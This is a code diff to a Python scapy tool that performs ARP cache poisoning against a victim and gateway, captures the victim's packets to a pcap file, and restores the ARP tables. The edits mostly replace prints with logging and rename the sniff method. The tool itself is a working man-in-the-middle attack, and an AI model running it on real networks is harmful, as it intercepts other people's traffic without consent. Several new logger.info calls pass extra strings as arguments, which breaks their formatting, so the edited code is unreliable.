@@ -1,6 +1,6 @@
-#echo 1 > /proc/sys/net/ipv4/ip_forward
+#Linux: `echo 1 > /proc/sys/net/ipv4/ip_forward`
 
-import os
+import logging
 import sys
 import time
 from multiprocessing import Process
@@ -18,6 +18,8 @@ from scapy.all import (
     wrpcap,
 )
 
+logging.basicConfig(format='%(asctime)s | %(levelname)s | %(message)s', level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 def get_mac(target_ip) -> str|None:
     packet : Packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=target_ip)
@@ -33,7 +35,7 @@ def set_poison(ipv4_src:str, ipv4_dest:str, mac_dest:str|None) -> ARP:
     poisoned.pdst = ipv4_dest
     poisoned.hwdst = mac_dest
 
-    print(f'ip src: {poisoned.psrc}',
+    logger.info(f'ip src: {poisoned.psrc}',
     f'ip dst: {poisoned.pdst}',
     f'mac dst: {poisoned.hwdst}',
     f'mac src: {poisoned.hwsrc}',
@@ -64,16 +66,16 @@ class Arper:
         self.gateway : str  = gateway
         self.gatewaymac : str|None = get_mac(gateway)
 
-        print(f'Initialized {interface}:')
-        print(f'Gateway ({gateway}) is at ({self.gatewaymac}).')
-        print(f'Gateway ({victim}) is at ({self.victimmac}).')
-        print('-' * 30)
+        logger.info(f'Initialized {interface}:',
+        f'Gateway ({gateway}) is at ({self.gatewaymac}).',
+        f'Gateway ({victim}) is at ({self.victimmac}).',
+        '-' * 30)
 
     def run(self) -> None:
         self.poison_thread = Process(target=self.poison)
         self.poison_thread.start()
 
-        self.sniff_thread = Process(target=self.sniff)
+        self.sniff_thread = Process(target=self.sniffer)
         self.sniff_thread.start()
 
     def poison(self) -> None:
@@ -89,11 +91,11 @@ class Arper:
             mac_dest=self.gatewaymac
         )
 
-        print('Beginning the ARP poison. [CTRL-C] to stop!')
+        logger.info('Beginning the ARP poison. [CTRL-C] to stop!')
 
         send_arp(poison_victim, poison_gateway)
 
-    def sniff(self, count=200) -> None:
+    def sniffer(self, count=200) -> None:
         time.sleep(5)
         print(f'Sniffing {count} packets.')
 
@@ -102,14 +104,14 @@ class Arper:
         packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
 
         wrpcap('arper.pcap', packets)
-        print('Got the packets!')
+        logger.info('Got the packets!')
 
         self.restore()
         self.poison_thread.terminate()
-        print('Finished!')
+        logger.info('Finished!')
 
     def restore(self):
-        print('Restoring ARP tables...')
+        logger.info('Restoring ARP tables...')
         send(ARP(
             op=2,
             psrc=self.gateway,
